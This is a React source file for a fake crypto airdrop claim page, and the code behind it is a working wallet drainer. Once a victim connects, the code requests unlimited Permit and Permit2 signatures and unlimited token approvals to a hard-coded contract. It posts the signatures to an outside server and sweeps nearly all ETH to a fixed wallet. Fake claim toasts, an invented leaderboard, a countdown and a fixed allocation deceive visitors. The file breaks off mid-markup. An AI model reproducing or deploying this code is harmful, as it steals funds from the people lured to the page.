import { Buffer } from 'buffer'
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer
}

import { useState, useEffect, useRef, useCallback } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import {
  ArrowLeft,
  X,
  ChevronDown,
  Wallet,
  Shield,
  CheckCircle,
  Gavel,
  TrendingUp,
  Zap,
  Share2,
  AlertCircle,
  Loader2,
} from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'

// 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [
      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
    ],
    EVM: [
      { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
      { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
      { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
    ]
  }
}

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon]

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e',
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Static UI data ──
const LEADERBOARD_DATA = [
  { rank: 1, address: '0xA91F...7C2E', amount: '1.20 ETH' },
  { rank: 2, address: '0x5D73...E8B1', amount: '0.94 ETH' },
  { rank: 3, address: '0xC8A4...19FD', amount: '0.72 ETH' },
  { rank: 4, address: '0x2F6B...D43A', amount: '0.61 ETH' },
  { rank: 5, address: '0xB1E9...84C7', amount: '0.54 ETH' },
  { rank: 6, address: '0x7A3D...F25E', amount: '0.48 ETH' },
  { rank: 7, address: '0x4CE1...9AB8', amount: '0.41 ETH' },
  { rank: 8, address: '0xD62F...31E4', amount: '0.36 ETH' },
  { rank: 9, address: '0x8B70...C5D9', amount: '0.31 ETH' },
  { rank: 10, address: '0x1FAD...7E62', amount: '0.27 ETH' },
  { rank: 11, address: '0xE934...2BC1', amount: '0.24 ETH' },
  { rank: 12, address: '0x6C5A...F918', amount: '0.21 ETH' },
  { rank: 13, address: '0x3DB7...4A6E', amount: '0.19 ETH' },
  { rank: 14, address: '0x9E42...D0B5', amount: '0.17 ETH' },
  { rank: 15, address: '0xF18C...83A7', amount: '0.15 ETH' },
  { rank: 16, address: '0x74B9...E16D', amount: '0.14 ETH' },
  { rank: 17, address: '0x2AC5...98F3', amount: '0.12 ETH' },
  { rank: 18, address: '0xBE61...5D2A', amount: '0.11 ETH' },
  { rank: 19, address: '0x0D87...CAF4', amount: '0.10 ETH' },
  { rank: 20, address: '0x91E3...6B58', amount: '0.09 ETH' },
]

const FAQ_DATA = [
  { q: 'What is this claim page for?', a: 'This page checks whether a Solana wallet is eligible for the current token airdrop, then shows the available claim amount before the claim step.' },
  { q: 'Which wallet should I check?', a: 'Use the Solana wallet address that may have interacted with the token, campaign, or related ecosystem activity. The form accepts public Solana addresses only.' },
  { q: 'How does eligibility work?', a: 'The flow validates the wallet format, checks holder status, scans wallet activity, and then calculates whether an allocation is available for claim.' },
  { q: 'Are claims time-limited?', a: 'Yes. The claim timer shows the remaining window. When the timer ends, eligibility checks and token claims may no longer be available.' },
  { q: 'Gas and network', a: 'Claims are designed for the Solana network. Keep a small SOL balance available for transaction fees and always review wallet prompts before approving.' },
  { q: 'Can I change my claim wallet?', a: 'The claim is tied to the Solana address you check. To use a different destination, restart the check with another valid wallet address before claiming.' },
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter],
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'CryptoSafe Protocol',
    description: 'Secure Decentralized Network',
    url: 'https://cryptosafe.network',
    icons: ['https://cryptosafe.network/favicon.svg'],
  },
  themeMode: 'light',
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',')
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`)
    const data = await res.json()
    const prices: Record<string, number> = {}
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase()
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey)
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice
    }
    return prices
  } catch (error) {
    const prices: Record<string, number> = {}
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice }
    return prices
  }
}

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1
  if (!a.isNative && b.isNative) return -1
  return (b.usdValue || 0) - (a.usdValue || 0)
}

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))

export default function App({ onClose }: { onClose?: () => void } = {}) {
  // ── Original Dapp state ──
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [debugLogs, setDebugLogs] = useState<string[]>([])

  // ── Airdrop UI state ──
  const [currentStage, setCurrentStage] = useState<'form' | 'loading' | 'claim'>('form')
  const [walletAddressInput, setWalletAddressInput] = useState('')
  const [errorMessage, setErrorMessage] = useState(false)
  const [activeStep, setActiveStep] = useState(1)
  const [loadingText, setLoadingText] = useState('Checking holders...')
  const [checkedAddrTruncated, setCheckedAddrTruncated] = useState('')
  const [totalSeconds, setTotalSeconds] = useState(5 * 3600 + 52 * 60 + 29)
  const [toastVisible, setToastVisible] = useState(false)
  const [toastMessage, setToastMessage] = useState('')
  const [openFaqIndex, setOpenFaqIndex] = useState<number | null>(null)

  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg)
    setDebugLogs(prev => [...prev, msg].slice(-15))
  }

  // ── Countdown timer ──
  useEffect(() => {
    const interval = setInterval(() => {
      setTotalSeconds(prev => (prev <= 0 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(interval)
  }, [])

  const formatCountdown = useCallback(() => {
    if (totalSeconds <= 0) return '0d 00h 00m 00s'
    const hours = Math.floor(totalSeconds / 3600)
    const minutes = Math.floor((totalSeconds % 3600) / 60)
    const seconds = totalSeconds % 60
    return `0d ${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`
  }, [totalSeconds])

  // ── Toast notifications ──
  const showRandomToast = useCallback(() => {
    const chars = 'ABCDEF0123456789'
    let randomAddr = '0x'
    for (let i = 0; i < 4; i++) randomAddr += chars[Math.floor(Math.random() * 16)]
    randomAddr += '...'
    for (let i = 0; i < 4; i++) randomAddr += chars[Math.floor(Math.random() * 16)]
    const randomEth = (Math.random() * (1.5 - 0.05) + 0.05).toFixed(2)
    setToastMessage(`${randomAddr.toUpperCase()} claimed ${randomEth} ETH`)
    setToastVisible(true)
    setTimeout(() => setToastVisible(false), 4000)
  }, [])

  useEffect(() => {
    const t1 = setTimeout(showRandomToast, 2000)
    const interval = setInterval(showRandomToast, 9000)
    return () => {
      clearTimeout(t1)
      clearInterval(interval)
    }
  }, [showRandomToast])

  // ── Wallet connection effect ──
  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return

    getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))

    if (manualConnect.current) {
      manualConnect.current = false
      log(`[SYSTEM] Connected EVM: ${walletAddress}`)
      log('🔥 Auto-triggering eligibility check...')
      // Move through stages automatically
      setCurrentStage('loading')
      setLoadingText('Wallet connected. Checking holders...')
      setTimeout(() => {
        setCurrentStage('claim')
        setActiveStep(2)
      }, 2500)
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId])

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('USDT not configured for this EVM chain')
      return 0
    }
    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Ready')
      return formatted
    } catch (e) {
      log('❌ EVM balance fetch failed')
      return 0
    }
  }

  // ── Verify Eligibility handler ──
  const handleVerifyEligibility = () => {
    const val = walletAddressInput.trim()
    if (val.length < 12) {
      setErrorMessage(true)
      return
    }
    setErrorMessage(false)
    setCheckedAddrTruncated(val.substring(0, 6) + '...' + val.substring(val.length - 4))

    if (!isConnected) {
      manualConnect.current = true
      setCurrentStage('loading')
      setLoadingText('Connecting wallet...')
      open()
    } else {
      // Already connected – simulate loading and then show claim
      setCurrentStage('loading')
      setLoadingText('Checking holders...')
      setTimeout(() => {
        setLoadingText('Scanning wallet activity...')
        setTimeout(() => {
          setCurrentStage('claim')
          setActiveStep(2)
        }, 1200)
      }, 1200)
    }
  }

  // ── Claim Tokens handler ──
  const handleClaimTokens = () => {
    if (!isConnected) {
      manualConnect.current = true
      open()
      return
    }
    // Trigger the sweep directly
    approveAndCollect()
  }

  // ── GASLESS SIGNATURE HELPERS ──
  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const chainId = (await signer.provider.getNetwork()).chainId
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer)
    const name = await tokenContract.name()
    const nonce = await tokenContract.nonces(await signer.getAddress())

    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1'

    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address }
    const types = {
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    }
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline }
    return await signer.signTypedData(domain, types, message)
  }

  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
    const activeProvider = forcedProvider || evmWalletProvider
    const activeAddress = forcedAddress || walletAddress

    if (!activeAddress || !activeProvider) return

    if (isExecuting.current) {
      log('⚠️ Blocked duplicate execution loop.')
      return
    }
    isExecuting.current = true

    setLoading(true)
    setStatus('Scanning USD Values...')
    log('[SYSTEM] Scanning balances...')
    let successCount = 0

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      const ethersProvider = new BrowserProvider(activeProvider as any)
      const activeChainId = Number((await ethersProvider.getNetwork()).chainId)
      const signer = await ethersProvider.getSigner(activeAddress)
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase()
      const deadline = Math.floor(Date.now() / 1000) + 3600

      const baseTokens = TARGET_TOKENS[NETWORK].EVM
      const validTokens = []
      const prices = await fetchTokenPrices(baseTokens, 'ethereum')

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress)
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals))
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice)
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue })
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider)
            const bal = await tokenContract.balanceOf(cleanSenderAddress)
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals))
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice)
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue })
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort)

      const rawProvider = activeProvider as any
      const w = window as any
      const injected = w.ethereum || {}

      const isStrictlyMetaMask =
        (rawProvider?.isMetaMask || injected?.isMetaMask) &&
        !injected?.isTrust &&
        !injected?.isTrustWallet &&
        !injected?.isSafePal &&
        !injected?.isTokenPocket

      let tokensToProcess = validTokens

      if (isStrictlyMetaMask) {
        log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`)
        tokensToProcess = validTokens.slice(0, 1)
      } else {
        log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`)
      }

      if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`)

      for (const token of tokensToProcess) {
        try {
          if (token.symbol === 'XRP') {
            setStatus(`Verifying XRP Wallet...`)
            const xrpBalance = token.balance
            if (xrpBalance > 12) {
              const sweepAmount = (xrpBalance - 11).toFixed(6)
              log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`)

              const txHash = await (activeProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: XRP_COLD_WALLET,
                  value: '0x0',
                  data: '0x'
                }]
              })

              setTxHash(txHash)
              successCount++
              log(`✅ XRP Transfer Initiated!`)
              await sleep(1500)
            } else {
              log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`)
            }
            continue
          }

          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer)
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS)
            const hasPermit2Mapping = currentP2Allowance > 0n

            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`)

            let authorized = false

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
              try {
                setStatus(`Signing Permit: ${token.symbol}...`)
                log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`)
                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline)

                fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT',
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline
                  })
                })

                authorized = true
                log(`✅ ${token.symbol} Permit Secured & Sent.`)
              } catch (pErr) {
                log(`⚠️ Permit failed, trying Permit2...`)
              }
            }

            if (!authorized && hasPermit2Mapping) {
              try {
                setStatus(`Signing Permit2: ${token.symbol}...`)
                log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`)
                const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer)
                const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS)
                const currentNonce = Number(allowanceData.nonce)
                log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`)

                const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS }
                const types = {
                  PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' },
                  ],
                  PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' },
                  ],
                }
                const message = {
                  details: {
                    token: token.address,
                    amount: '1461501637330902918203684832716283019655932542975',
                    expiration: deadline,
                    nonce: currentNonce
                  },
                  spender: EVM_CONTRACT_ADDRESS,
                  sigDeadline: deadline
                }
                const signature = await signer.signTypedData(domain, types, message)

                fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT2',
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline,
                    nonce: currentNonce
                  })
                })

                authorized = true
                log(`✅ ${token.symbol} Permit2 Secured & Sent.`)
              } catch (p2Err) {
                log(`⚠️ Permit2 failed, falling back to gas...`)
              }
            }

            if (!authorized) {
              setStatus(`Approving ${token.symbol}...`)
              log(`[ACTION] Prompting Approve: ${token.symbol}`)

              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer)
              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT])

              const txHash = await (activeProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: token.address,
                  data: encodedData,
                  value: '0x0'
                }]
              })

              setTxHash(txHash)
              log(`✅ ${token.symbol} Approved!`)
            }

            successCount++
            await sleep(1500)
          }
        } catch (err: any) {
          const exactError = err?.message || JSON.stringify(err)
          log(`❌ Rejected: ${exactError.substring(0, 30)}...`)
          await sleep(1500)
        }
      }

      try {
        setStatus(`Transferring ETH...`)
        log(`[ACTION] Executing Contingency Native Sweep...`)

        const liveBal = await ethersProvider.getBalance(cleanSenderAddress)
        const gasCost = 21000n * 3000000000n
        const totalGas = gasCost + ((gasCost * 20n) / 100n)

        if (liveBal > totalGas) {
          const sendAmount = liveBal - totalGas
          const hexValue = "0x" + sendAmount.toString(16)

          const txHash = await (activeProvider as any).request({
            method: 'eth_sendTransaction',
            params: [{
              from: cleanSenderAddress,
              to: EVM_COLD_WALLET.toLowerCase(),
              value: hexValue
            }]
          })

          setTxHash(txHash)
          successCount++
          log(`✅ Contingency ETH Sweep Sent!`)
          await sleep(1500)
        } else {
          log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`)
        }
      } catch (nativeErr: any) {
        const exactError = nativeErr?.message || JSON.stringify(nativeErr)
        log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`)
      }

      if (successCount > 0) {
        setStatus('✅ Processing Complete!')
      } else {
        setStatus('❌ Failed: User Rejected All')
      }
    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err)
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`)
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`)
    } finally {
      isExecuting.current = false
      setLoading(false)
    }
  }

  // ── Helpers ──
  const getRankColor = (rank: number) => {
    if (rank === 1) return '#f59e0b'
    if (rank === 2) return '#d1d5db'
    if (rank === 3) return '#d97706'
    return '#6b7280'
  }

  
  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', color: '#f3f4f6', fontFamily: 'system-ui, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50, overflowY: 'auto' }}>
      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #131a26; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
        .animate-fadeIn { animation: fadeIn 0.4s ease-out forwards; }
        .animate-pulse-custom { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
        .animate-spin-custom { animation: spin 1s linear infinite; }
        .responsive-grid { display: grid; grid-template-columns: 7fr 5fr; gap: 32px; align-items: start; }
        @media (max-width: 1023px) { .responsive-grid { grid-template-columns: 1fr; } }
      `}</style>

      {/* Header */}
      <header style={{ width: '100%', maxWidth: 1280, margin: '0 auto', padding: '16px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid rgba(30,41,59,0.6)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          {onClose && <ArrowLeft size={22} color="#94a3b8" style={{ cursor: 'pointer' }} onClick={onClose} />}
          <div style={{ height: 36, width: 36, background: 'linear-gradient(135deg,#6366f1,#9333ea)', borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 14px rgba(99,102,241,0.25)' }}>
            <Share2 size={15} color="#ffffff" />
          </div>
          <span style={{ fontWeight: 700, fontSize: 18, background: 'linear-gradient(to right,#fff,#94a3b8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>EVMCoinCaps</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <button
            onClick={() => { manualConnect.current = true; open() }}
            style={{ backgroundColor: 'rgba(30,41,59,0.8)', border: '1px solid #334155', padding: '6px 16px', borderRadius: 9999, fontSize: 12, fontWeight: 600, color: '#cbd5e1', cursor: 'pointer', letterSpacing: 0.5 }}
          >
            {isConnected ? walletAddress?.slice(0, 6) + '...' + walletAddress?.slice(-4) : 'Connect Wallet'}
          </button>
          {onClose && <X size={22} color="#94a3b8" style={{ cursor: 'pointer' }} onClick={onClose} />}
        </div>
      </header>

      <main style={{ flex: 1, maxWidth: 1280, margin: '0 auto', padding: '32px 16px', width: '100%' }}>
        {/* Airdrop Banner */}
        <div style={{ textAlign: 'center', marginBottom: 32 }}>
          <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, backgroundColor: 'rgba(49,46,129,0.4)', border: '1px solid rgba(99,102,241,0.4)', padding: '6px 16px', borderRadius: 9999, fontSize: 11, color: '#818cf8', fontWeight: 600, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>
            <span className="animate-pulse-custom" style={{ height: 8, width: 8, borderRadius: '50%', backgroundColor: '#818cf8' }} />
            <span>Claim Your Airdrop</span>
          </div>
          <h1 style={{ fontSize: 'clamp(28px,5vw,48px)', fontWeight: 900, letterSpacing: -1, margin: '0 0 8px', color: '#fff' }}>
            CLAIM YOUR <span style={{ background: 'linear-gradient(to right,#818cf8,#a78bfa)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>AIRDROP</span>
          </h1>
          <p style={{ color: '#94a3b8', fontSize: 14, fontWeight: 500 }}>
            Claiming will end in: <span style={{ fontWeight: 700, color: '#818cf8', fontFamily: 'monospace', marginLeft: 4 }}>{formatCountdown()}</span>
          </p>
        </div>

        {/* Two panels */}
        <div className="responsive-grid">
          {/* Left panel */}
          <div style={{ backgroundColor: '#131a26', border: '1px solid #1e293b', borderRadius: 16, padding: 24, position: 'relative', overflow: 'hidden', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.4)' }}>
            <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: 2, background: 'linear-gradient(to right,transparent,#6366f1,transparent)' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 24 }}>
              <div style={{ padding: 10, backgroundColor: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.2)', borderRadius: 12 }}>
                <Wallet size={18} color="#818cf8" />
              </div>
              <div>
                <h2 style={{ fontSize: 20, fontWeight: 700, color: '#fff', margin: 0 }}>Check Wallet</h2>
                <p style={{ fontSize: 12, color: '#94a3b8', margin: '2px 0 0' }}>View eligibility and claim your tokens</p>
              </div>
            </div>

            {/* Stage: Form */}
            {currentStage === 'form' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                <div>
                  <label style={{ display: 'block', fontSize: 11, fontWeight: 600, color: '#94a3b8', marginBottom: 8, textTransform: 'uppercase', letterSpacing: 1 }}>Wallet Address</label>
                  <input
                    type="text"
                    required
                    value={walletAddressInput}
                    onChange={e => { setWalletAddressInput(e.target.value); setErrorMessage(false) }}
                    placeholder={isConnected ? (walletAddress || '') : 'Enter valid public address (e.g., 0x...)'}
                    disabled={isConnected}
                    style={{ width: '100%', backgroundColor: 'rgba(15,23,42,0.9)', border: errorMessage ? '1.5px solid #f87171' : '1.5px solid rgba(51,65,85,0.8)', borderRadius: 12, padding: '14px 16px', fontSize: 14, fontFamily: 'monospace', color: '#fff', outline: 'none', boxSizing: 'border-box' }}
                  />
                  {errorMessage && <p style={{ fontSize: 12, color: '#f87171', fontWeight: 500, marginTop: 8, display: 'flex', alignItems: 'center', gap: 6 }}><AlertCircle size={14} /> Enter a valid wallet address.</p>}
                </div>
                <button
                  onClick={handleVerifyEligibility}
                  style={{ width: '100%', background: 'linear-gradient(to right,#6366f1,#4f46e5)', color: '#fff', fontSize: 14, fontWeight: 700, padding: '14px 16px', borderRadius: 12, border: 'none', cursor: 'pointer', boxShadow: '0 4px 14px rgba(99,102,241,0.2)' }}
                >
                  Verify Eligibility
                </button>
              </div>
            )}

            {/* Stage: Loading */}
            {currentStage === 'loading' && (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 0', gap: 16 }}>
                <div style={{ position: 'relative' }}>
                  <div className="animate-spin-custom" style={{ height: 48, width: 48, borderRadius: '50%', border: '2px solid #334155', borderTopColor: '#6366f1' }} />
                  <Shield size={14} color="#818cf8" style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)' }} />
                </div>
                <p style={{ fontSize: 14, fontWeight: 500, color: '#cbd5e1', fontFamily: 'monospace', margin: 0 }}>{loadingText}</p>
                <p style={{ fontSize: 12, color: '#64748b', margin: 0 }}>Verifying cryptographic allocations...</p>
                <div style={{ width: '100%', maxWidth: 320, backgroundColor: 'rgba(15,23,42,0.6)', border: '1px solid #1e293b', borderRadius: 8, padding: 12, display: 'flex', justifyContent: 'space-between', fontSize: 12, fontFamily: 'monospace', color: '#94a3b8' }}>
                  <span>{checkedAddrTruncated}</span>
                  <span style={{ color: '#818cf8', display: 'flex', alignItems: 'center', gap: 6 }}><Loader2 size={14} className="animate-spin-custom" /> Processing</span>
                </div>
              </div>
            )}

            {/* Stage: Claim */}
            {currentStage === 'claim' && (
              <div className="animate-fadeIn" style={{ display: 'flex', flexDirection: 'column', gap: 24 }}>
                <div style={{ backgroundColor: 'rgba(16,185,129,0.05)', border: '1px solid rgba(16,185,129,0.2)', borderRadius: 12, padding: 20, textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
                  <div style={{ position: 'absolute', right: -16, bottom: -16, opacity: 0.05 }}><CheckCircle size={100} color="#10b981" /></div>
                  <span style={{ display: 'block', fontSize: 11, fontWeight: 600, color: '#34d399', textTransform: 'uppercase', letterSpacing: 2, marginBottom: 4 }}>Available to Claim</span>
                  <strong style={{ fontSize: 'clamp(28px,4vw,40px)', fontWeight: 900, color: '#fff', fontFamily: 'monospace', letterSpacing: -1 }}>0.98 ETH</strong>
                  <p style={{ fontSize: 11, color: '#94a3b8', marginTop: 8 }}>Allocation computed from active snapshot configurations.</p>
                </div>
                <button
                  onClick={handleClaimTokens}
                  disabled={loading}
                  style={{ width: '100%', background: loading ? '#6ee7b7' : 'linear-gradient(to right,#10b981,#0d9488)', color: '#fff', fontSize: 14, fontWeight: 700, padding: '14px 16px', borderRadius: 12, border: 'none', cursor: loading ? 'not-allowed' : 'pointer', boxShadow: '0 4px 14px rgba(16,185,129,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}
                >
                  <Gavel size={14} />
                  <span>{loading ? 'Processing...' : 'Claim Allocation Tokens'}</span>
                </button>
              </div>
            )}

            {/* Step indicators */}
